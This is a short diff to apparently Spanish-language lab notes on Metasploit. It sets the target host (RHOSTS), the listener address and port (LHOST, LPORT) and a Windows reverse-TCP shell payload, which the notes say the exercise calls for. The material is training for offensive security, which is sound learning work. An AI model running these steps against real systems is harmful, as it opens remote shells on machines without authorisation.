@@ -20,7 +20,9 @@ show options -- para ver que opciones debemos ajustar como el RHOSTS
 
 set RHOSTS 10.10.38.140 --apra poder atacar a la maquina
 
-set LHOST tu ip
+set LHOST --tu ip
+
+set LPORT puerto --si no va el predefinido
 
 set payload windows/x64/shell/reverse_tcp --lo dice el ejercicio
 
